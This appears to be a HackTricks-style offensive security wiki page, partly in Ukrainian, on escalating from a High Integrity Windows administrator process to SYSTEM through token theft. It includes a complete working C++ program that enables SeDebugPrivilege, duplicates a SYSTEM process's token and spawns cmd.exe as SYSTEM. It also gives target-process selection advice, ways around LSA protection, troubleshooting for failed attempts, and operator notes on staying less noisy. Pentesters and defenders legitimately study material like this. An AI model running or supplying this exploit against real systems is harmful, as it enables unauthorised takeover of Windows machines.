# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка про **manual** версію переходу з **High Integrity administrator process** до **`NT AUTHORITY\SYSTEM`** шляхом **відкриття незахищеного SYSTEM process, дублювання його token, і запуску дочірнього process з тим token**.

Якщо у тебе є лише **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**, але **не можеш відкрити відповідний SYSTEM process**, шлях через **Potato / named-pipe** зазвичай надійніший:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Якщо тобі потрібен не лише `SYSTEM`, а **SYSTEM token з максимально можливою кількістю privileges**, також перевір:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

Перед тим як намагатися вкрасти token, швидко перевір context:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Практичні нотатки:

- **High Integrity** admin token зазвичай достатньо, щоб **увімкнути `SeDebugPrivilege`** і відкрити багато non-protected SYSTEM process.
- **`CreateProcessWithTokenW` вимагає `SeImpersonatePrivilege`** у caller. Якщо цей API завершується помилкою `1314`, перейдіть на `CreateProcessAsUserW` після того, як ви вже продублювали SYSTEM primary token.
- На сучасних Windows, **`lsass.exe` часто є поганою ціллю** через **LSA protection / PPL**, які блокують доступ навіть для administrators з `SeDebugPrivilege`. Віддавайте перевагу **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, або ранньому **`svchost.exe`**, що працює як SYSTEM.
- Не кожен SYSTEM process має однаково корисний token. Якщо ви отримали SYSTEM, але помітили відсутні privileges, спробуйте інший SYSTEM process замість того, щоб вважати technique зламаною.

## Pick the PID carefully

Найпростіший спосіб зробити це надійно — **обрати SYSTEM process, чий DACL справді дозволяє Administrators query process і duplicate його token**.

Good candidates to test first:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- деякі ранні `svchost.exe` instances, що працюють як SYSTEM

Avoid by default:

- `lsass.exe` на hosts, де увімкнено **RunAsPPL / LSA protection**
- protected / security-sensitive process, які повертають `Access denied` навіть після увімкнення `SeDebugPrivilege`

Ви можете перевірити candidate processes та їх token/ACLs за допомогою **Process Explorer** або **Process Hacker**, запущених elevated.

### Code

The following code from [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). It allows to **indicate a Process ID as argument** and a CMD **running as the user** of the indicated process will be run.\
Running in a High Integrity process you can **indicate the PID of a process running as System** (like `winlogon`, `wininit`) and execute a `cmd.exe` as SYSTEM.
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Useful API / access-note

The sample uses `MAXIMUM_ALLOWED`, but for real operations it's useful to remember the minimum pieces involved:

- `OpenProcessToken()` only requires that the **process handle** was opened with **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- To use `CreateProcessWithTokenW()`, the **primary token handle** must have **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- `DuplicateTokenEx()` must create a **primary token** (`TokenPrimary`), not only an impersonation token.
- If you already impersonated SYSTEM and `CreateProcessWithTokenW()` still fails with `1314`, try `CreateProcessAsUserW()` instead.

That means that **opening the target process with `PROCESS_ALL_ACCESS` is usually unnecessary and noisier** than just requesting the rights needed to query the token.

## Error

On some occasions you may try to impersonate System and it won't work showing an output like the following:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Це означає, що навіть якщо ви працюєте на рівні High Integrity, **у вас недостатньо permissions** над цільовим процесом/token.\
Давайте перевіримо поточні Administrator permissions над процесами `svchost.exe` за допомогою **Process Explorer** (або також можна використати **Process Hacker**):

1. Виберіть процес `svchost.exe`
2. Клікніть правою кнопкою --> Properties
3. У вкладці "Security" натисніть у правому нижньому куті кнопку "Permissions"
4. Натисніть "Advanced"
5. Виберіть "Administrators" і натисніть "Edit"
6. Натисніть "Show advanced permissions"

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

Попереднє зображення містить усі privileges, які "Administrators" мають над вибраним процесом (як ви бачите, у випадку `svchost.exe` вони мають лише privileges "Query")

Подивіться privileges, які "Administrators" мають над `winlogon.exe`:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

У цьому процесі "Administrators" можуть "Read Memory" і "Read Permissions", що, ймовірно, дозволяє Administrators impersonate token, який використовує цей процес.

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: DACL процесу блокує вас, або цільовий процес **protected/PPL**. Виберіть інший SYSTEM процес.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: дескриптор token було відкрито без достатніх прав, або DACL цільового token забороняє duplication.
- **`CreateProcessWithTokenW()` -> `1314`**: у викликача наразі не увімкнено **`SeImpersonatePrivilege`**. Спробуйте спочатку увімкнути його або використайте `CreateProcessAsUserW()` із duplicated primary token.
- **`CreateProcessWithTokenW()` -> `1326`** після попередніх помилок: зазвичай це означає, що попередній крок token duplication/impersonation не вдався, тому немає придатного primary token для запуску дочірнього процесу.

## Operator notes

- Ця technique чудово підходить, коли ви вже є **local admin + high integrity** і просто хочете швидкий, ручний шлях до SYSTEM без запуску service або named-pipe coercion chain.
- На hardened Windows 11 / Server середовищах **LSA protection** стає дедалі поширенішим, тому workflow, який припускає, що `lsass.exe` завжди можна read, є крихким. **`winlogon.exe` / `wininit.exe` / `services.exe` зазвичай є кращими першими виборами**.
- Якщо ви потрапили в контекст **service account** замість elevated admin desktop, то **Potato family** зазвичай краще підходить, ніж ця сторінка.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
